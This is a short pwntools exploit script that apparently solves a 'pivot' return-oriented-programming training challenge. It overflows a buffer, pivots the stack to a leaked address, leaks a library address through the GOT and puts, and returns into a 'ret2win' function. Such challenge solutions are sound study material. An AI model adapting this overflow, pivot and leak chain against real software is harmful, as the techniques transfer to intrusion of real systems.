from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x00000000004009a7
continue
'''.format(**locals())

exe = './pivot'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libpivot.so", checksec=False)
p = start()

pop_rax = 0x00000000004009bb
xchr_rax_rsp = 0x00000000004009bd
pop_rdi = 0x0000000000400a33

# ===== Exploit script here =====
p.recvuntil(b'pivot: '); leak = int(p.recvline(), 16)
info("Leak: " + hex(leak))
p.sendlineafter(b'> ', p64(elf.plt['foothold_function']) + p64(elf.entrypoint)) 
p.sendafter(b'> ', b'A'*40 + p64(pop_rax) + p64(leak) + p64(xchr_rax_rsp))


p.recvuntil(b'pivot: '); leak = int(p.recvline(), 16)
info("Leak: " + hex(leak))
p.sendlineafter(b'> ', p64(pop_rdi) + p64(elf.got['foothold_function']) + p64(elf.plt['puts']) + p64(elf.entrypoint)) 
p.sendafter(b'> ', b'A'*40 + p64(pop_rax) + p64(leak) + p64(xchr_rax_rsp)); p.recvline()
leak_libc = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak_libc - libc.sym['foothold_function']


p.sendlineafter(b'> ', b'hehe') 
p.sendafter(b'> ', b'A'*40 + p64(libc.sym['ret2win']))
p.interactive()